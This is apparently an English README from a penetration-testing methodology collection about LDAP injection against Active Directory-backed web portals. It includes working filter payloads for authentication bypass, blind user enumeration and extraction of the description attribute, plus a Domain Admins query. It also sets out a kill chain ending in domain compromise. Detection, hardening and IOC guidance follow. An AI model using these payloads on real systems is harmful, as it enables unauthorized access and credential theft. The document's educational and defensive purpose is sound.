> **English** | [Italiano](README.md)

# LDAP injection

> - **Phase:** Web Exploitation - OWASP A03:2021 Injection (LDAP filter built with unsanitized input)
> - **Visibility:** Medium - anomalous LDAP queries toward the directory server; wildcard enumeration generates an unusual volume of binds/searches
> - **Prerequisites:** an application that builds an LDAP filter by concatenating user input (portal login, user search, directory lookup) toward an LDAP/Active Directory backend
> - **Nature of the document:** methodology. Illustrative payloads (OWASP didactic form), no fabricated Finding ID (next `WEB-016`, to assign in lab).

- Objective: manipulate the logic of an LDAP filter to achieve authentication bypass, enumeration of directory users and extraction of sensitive attributes, with a direct impact on Active Directory.

---

## Executive summary

LDAP Injection is the equivalent of SQL Injection applied to LDAP filters. Many enterprise applications
(webmail portals, VPN, intranet, helpdesk) verify credentials with an LDAP query toward a Domain Controller. If
the filter is built by concatenating user input without sanitization, an attacker can inject the metacharacters
of the LDAP syntax (`&`, `|`, `!`, `*`, parentheses) and alter the meaning of the query.

The difference from SQLi is the target: here you do not attack an application database but the **corporate
directory** (Active Directory, OpenLDAP, FreeIPA), i.e., the system that governs the users, groups and policies
of the entire organization. The three main impacts are: **authentication bypass** (login without a password),
**full user enumeration** and **extraction of sensitive attributes** (phone, email, groups and, not rarely,
passwords left in cleartext in the `description` field). The typical severity is `High` and rises to `Critical`
when it leads to a privileged account.

## Operational context (why, before how)

LDAP Injection is sought on every feature that queries the directory: login forms, user search, address book,
lookups. The initial test is minimal and non-destructive: you check whether a special character (the wildcard)
changes the application's behavior. The next operational decision depends on the feedback: if the app shows
different messages for "nonexistent user" and "wrong password", you can enumerate; if it reflects the content,
you extract; otherwise you proceed blind, character by character, as in [blind SQLi](<../sql-injection (SQLi)/README.en.md>).

## Execution / commands

### Phase 1 - confirm the vulnerability (non-destructive test)

A typical authentication filter has this form (prefix notation, with AND between the two conditions):

```
(&(uid=USERNAME)(userPassword=PASSWORD))
```

The test consists of sending the wildcard `*` as the username and observing whether the response changes (e.g., a
different error, or "multiple users found"). A change indicates that the input reaches the filter without escape.

### Phase 2 - authentication bypass

You inject metacharacters that prematurely close the filter and introduce an always-true condition, making the
password irrelevant. Payloads in the username field (any password):

```
*                       <-- wildcard: matches all users, authenticates the first (often admin)
admin)(&)               <-- closing + always-true (&)
admin))(|(uid=*         <-- OR injection: forces the clause to TRUE
*)(uid=*))(|(uid=*      <-- OR variant with wildcard
```

Example of how `admin)(&)` alters the vulnerable filter `(&(uid=INPUT)(userPassword=PASS))`:

```
(&(uid=admin)(&))(userPassword=PASS))
         ^^^^  the (&) sub-clause is always true; the password is no longer evaluated
```

### Phase 3 - enumeration and extraction (blind)

If the application responds differently to true and false conditions, you enumerate users by prefix and extract
attributes one character at a time. The highest-value attribute in AD is `description`, where it is (bad but
widespread) practice to note temporary passwords.

```
# User enumeration by prefix (in the username field)
a*     -> "wrong password"     <-- users starting with 'a' exist
b*     -> "nonexistent user"   <-- no user starts with 'b'
adm*   -> "wrong password"     <-- 'admin' or similar exists

# Blind extraction of 'admin' description field, character by character
admin)(description=P*       -> TRUE   <-- the description starts with 'P'
admin)(description=Pass*    -> TRUE
admin)(description=Password1*  -> TRUE ... up to the full string

# Enumerate members of a privileged group (via search)
*)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local   <-- lists the Domain Admins
```

API/JSON variant (LDAP backend behind a REST endpoint):

```
POST /api/v2/auth/login    {"username": "admin)(&)", "password": "x"}
POST /api/v2/users/search  {"query": "*)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local"}
```

## Analysis of results

A successful authentication bypass grants application access with another user's identity (often the first in
the directory, typically privileged). Enumeration provides the full list of AD users; extraction of the
`description` field can return reusable cleartext passwords. The real severity ranges from `High` (bypass +
enumeration) to `Critical` when an extracted credential belongs to a high-privilege account (e.g., a service
account with domain rights). If the application escapes the metacharacters or uses parameterized binding, the
vector is closed (Phase 1 test negative).

### Theoretical analysis

LDAP Injection is an instance of the general injection problem [Su & Wassermann 2006]: confusing data and
instructions. The LDAP filter is code (a logical expression); if the user input is concatenated into it as a
string, the user can insert operators that the LDAP engine interprets as structure, not as data. The
countermeasure is the same as the entire injection family: separate data and code. In LDAP this means escaping
the metacharacters (`*`, `(`, `)`, `\`, NUL) or, better, using APIs that parameterize the filter (ldap3 in
Python, Spring LDAP in Java), so that the input can never alter the syntax.

## Remediation (blue team)

**Detection (directory server / SIEM).**
- LDAP queries containing suspicious metacharacters (`*`, `)(`, `|`, `!`) in the directory server logs.
- Anomalous volume of binds/searches from the same IP in a short time (sign of enumeration).
- Sequential accesses with usernames `a*`, `b*`, ... (prefix enumeration pattern).
- Successful binds against malformed filters.

**Hardening (secure coding).**
- Escape the LDAP metacharacters in the input (`*`, `(`, `)`, `\`, NUL, `/`) or use the library's parameterized
  search functions (the primary countermeasure).
- Input whitelisting: for usernames, allow only alphanumeric characters and `._-`.
- Same error message for "nonexistent user" and "wrong password" (prevents enumeration).
- Never use the `description` field (or free-text fields) to note passwords.
- Disable anonymous bind on the Domain Controller.

---

## Real-World scenario: Post-Exploitation projection

> Applies to the "auth bypass / credential extraction" outcome (severity High/Critical).

### Attacker perspective (red team)

**Starting point:** a corporate portal with LDAP authentication and unsanitized input (confirmed in Phase 1).

**Immediate next step:** authentication bypass as the first user in the directory, then enumeration and
extraction of the attributes of key users.

**Projected Kill Chain:**

```
LDAP Injection on a portal with an AD backend
        |
        v
Authentication bypass + enumeration of all domain users
        |
        v
Extraction of the description field -> cleartext passwords of service accounts
        |
        v
Password spray / reuse -> privileged account -> DCSync (domain compromised)
```

**Potential impact:** from an application vulnerability to domain control, when the extracted credentials open a
high-privilege account. The natural link is with the
[11-active-directory](<../../../11-active-directory (Windows Domain)/README.en.md>) module.

**Typical monetization vectors:** access to sensitive corporate data; domain compromise; resale of accesses.

### Defender perspective (blue team)

**Detection:** LDAP metacharacters in the directory server logs; spikes of binds/searches; prefix enumeration.

**Indicators of Compromise (IOC):**
- LDAP filters with `*`, `)(`, `|`, `!` not generated by the application.
- An anomalous number of binds from the same client in a short time.
- Accesses with sequential usernames `a*`, `b*`, ...

**Containment:** block the pattern via WAF; rotate the potentially extracted credentials (especially service
accounts); investigate the accesses.

**Eradication and hardening:** escaping/parameterization of the filters; uniform error messages; removal of
passwords from free-text fields; disabling of anonymous bind.

**Defensive lesson:** LDAP Injection shows how a seemingly "web" application flaw flows directly into the heart
of corporate identity. The defense is secure coding (separating data and code in the filter), not a downstream
control.

---

## Reference tools

| tool | type | technique/access | main use case |
| :--- | :--- | :--- | :--- |
| `Burp Suite` | proxy/scanner | web - active | intercepts and modifies the parameters sent to the ldap filter; fuzzing of metacharacters |
| `ldapsearch` | ldap client | cli - active | direct verification of the directory server's behavior and attributes |
| `python-ldap3` | python library | secure coding | parameterized binding/searches for the remediation (blue team) |
| `ffuf` / `wfuzz` | web fuzzer | cli - active | automation of prefix enumeration via differential responses |

## Methodology notes

In a real lab (e.g., an app with LDAP login or a didactic target) the data to document as a finding: the
confirmation of the wildcard test, the bypass outcome, the enumerated list and any extracted attributes. Any real
credentials extracted must be treated as sensitive data and redacted in the report. The payloads shown are in the
minimal didactic form, not a complete operational chain.

## MITRE ATT&CK mapping

| tactic | technique | mitre id | action description |
| :--- | :--- | :--- | :--- |
| initial access | exploit public-facing application | `T1190` | exploitation of the unsanitized ldap filter on an exposed application. |
| discovery | account discovery: domain account | `T1087.002` | enumeration of domain users via wildcard/differential conditions. |
| collection | data from information repositories | `T1213` | extraction of sensitive attributes (including passwords in the description field) from the directory. |

---

## Links to other findings

| source | this technique | effect |
| :--- | :--- | :--- |
| [02-web-recon](<../../02-web-recon (Enumeration)/README.en.md>) | ldap injection | enumeration identifies the portals with ldap/ad authentication |
| ldap injection (extracted credentials) | [11-active-directory](<../../../11-active-directory (Windows Domain)/README.en.md>) | the credentials open the domain attack phase (up to dcsync) |
| ldap injection | [secure-coding-lab](<../../06-secure-coding-lab (Defense)/README.en.md>) | the remediation (parameterized filters) links to the secure coding lab |

---

> **Note:** All described techniques are for educational and methodology-documentation purposes. Execution only on owned applications or with explicit authorization. The payloads are illustrative and do not come from real or third-party systems.
